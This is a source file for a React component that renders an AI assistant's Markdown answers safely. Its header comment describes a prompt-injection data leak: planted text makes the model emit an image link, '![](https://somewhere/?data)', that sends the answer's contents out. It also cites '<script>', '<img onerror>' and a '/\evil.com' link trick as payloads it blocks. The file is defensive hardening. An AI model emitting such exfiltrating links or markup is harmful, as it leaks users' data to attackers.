'use client';

import Link from 'next/link';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { ExternalLink } from 'lucide-react';
import { classifyLink } from '@/lib/safeLink';

/**
 * A Zen answer, as Markdown: bold figures, lists, tables, links, inline code.
 *
 * Answers used to be plain text, so a table came out as rows of pipes and a
 * client's name could not be a way to that client.
 *
 * Raw HTML is skipped, never rendered. The answer is a model's writing, built
 * partly from data people typed — a `<script>` or an `<img onerror>` in a task
 * note must reach the screen as nothing at all, not as markup. Links with a
 * dangerous scheme (`javascript:`) are dropped by react-markdown itself.
 *
 * An internal link (`/companies/…`) goes through the Next router, so the page
 * changes and Zen, which lives in the layout, stays open with the conversation
 * in it.
 *
 * Security fixes plan, H7 and M6:
 *   - **No images, ever.** `![](https://somewhere/?data)` in text a person
 *     planted was fetched the moment Zen quoted it — the answer's contents
 *     sent to that address without a click. An image is shown as a note.
 *   - **External links show where they go** and open only on a click, in a
 *     new tab with no opener and no referrer. What counts as internal is
 *     decided by `classifyLink`, so `/\evil.com` is another site, not a path.
 */
export function ZenMarkdown({ text, onInternalLink }: { text: string; onInternalLink?: () => void }) {
  const components: Components = {
    a: ({ href, children }) => {
      const link = classifyLink(href);
      if (link.kind === 'internal') {
        return (
          <Link href={link.href} onClick={onInternalLink} className="font-medium text-primary underline underline-offset-2 hover:no-underline">
            {children}
          </Link>
        );
      }
      if (link.kind === 'none') return <>{children}</>;
      return (
        <a
          href={link.href}
          target="_blank"
          rel="noopener noreferrer nofollow"
          referrerPolicy="no-referrer"
          title={`Opens ${link.host} in a new tab`}
          className="font-medium text-primary underline underline-offset-2 hover:no-underline"
        >
          {children}
          <span className="ml-1 whitespace-nowrap text-micro font-normal text-secondary no-underline">
            ({link.host}
            <ExternalLink className="ml-0.5 inline h-3 w-3 align-[-1px]" aria-hidden="true" />)
          </span>
        </a>
      );
    },
    // Never fetched: an image in an answer is a way out for the answer's contents.
    img: ({ alt }) => (
      <span className="text-micro text-secondary">[image not shown{alt ? `: ${alt}` : ''}]</span>
    ),
    p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
    strong: ({ children }) => <strong className="font-semibold text-primary">{children}</strong>,
    ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5 first:mt-0 last:mb-0">{children}</ul>,
    ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5 first:mt-0 last:mb-0">{children}</ol>,
    h1: ({ children }) => <p className="mb-1 mt-3 font-semibold text-primary first:mt-0">{children}</p>,
    h2: ({ children }) => <p className="mb-1 mt-3 font-semibold text-primary first:mt-0">{children}</p>,
    h3: ({ children }) => <p className="mb-1 mt-3 font-semibold text-primary first:mt-0">{children}</p>,
    code: ({ children }) => (
      <code className="rounded bg-subtle px-1 py-0.5 font-mono text-[0.85em] text-primary">{children}</code>
    ),
    pre: ({ children }) => <pre className="my-2 overflow-x-auto rounded-lg bg-subtle p-2.5 text-xs">{children}</pre>,
    blockquote: ({ children }) => <blockquote className="my-2 border-l-2 border-border pl-3 text-secondary">{children}</blockquote>,
    hr: () => <hr className="my-3 border-border" />,
    // A table scrolls inside the bubble rather than pushing the panel wider.
    table: ({ children }) => (
      <div className="my-2 overflow-x-auto first:mt-0 last:mb-0">
        <table className="w-full border-collapse text-xs tabular-nums">{children}</table>
      </div>
    ),
    th: ({ children, style }) => (
      <th style={style} className="border-b border-border px-2 py-1.5 text-left font-semibold text-primary">
        {children}
      </th>
    ),
    td: ({ children, style }) => (
      <td style={style} className="border-b border-border/60 px-2 py-1.5 align-top">
        {children}
      </td>
    ),
  };

  return (
    <div className="break-words">
      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={components}>
        {text}
      </ReactMarkdown>
    </div>
  );
}
